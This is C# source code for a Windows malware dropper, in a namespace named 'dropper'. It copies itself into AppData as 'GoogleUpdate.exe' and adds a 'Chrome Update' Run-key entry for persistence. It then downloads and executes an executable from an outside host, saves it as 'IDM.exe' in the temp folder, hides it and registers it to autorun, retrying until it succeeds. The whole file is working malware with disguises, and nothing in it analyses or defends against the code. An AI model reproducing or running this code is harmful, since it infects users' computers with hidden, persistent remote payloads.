using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;

namespace dropper;

internal class Program
{
	private static void downloader(string src, string dest)
	{
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile(src, dest);
		}
		Process.Start(dest);
	}

	private static void autorun(string dest)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("IDM", dest);
		}
		catch
		{
		}
	}

	private static void hidden(string dest)
	{
		try
		{
			File.SetAttributes(dest, FileAttributes.Hidden);
		}
		catch
		{
		}
	}

	private static void copyself()
	{
		try
		{
			string location = Assembly.GetExecutingAssembly().Location;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GoogleUpdate.exe";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Chrome Update", text);
			File.Copy(location, text);
			File.SetAttributes(text, FileAttributes.Hidden);
		}
		catch
		{
		}
	}

	private static void Main(string[] args)
	{
		copyself();
		string src = "http://vnsec.net/vp/new.exe";
		string dest = Environment.GetEnvironmentVariable("temp")!.ToString() + "\\IDM.exe";
		while (true)
		{
			try
			{
				downloader(src, dest);
				autorun(dest);
				hidden(dest);
				break;
			}
			catch
			{
				Thread.Sleep(10000);
			}
		}
	}
}
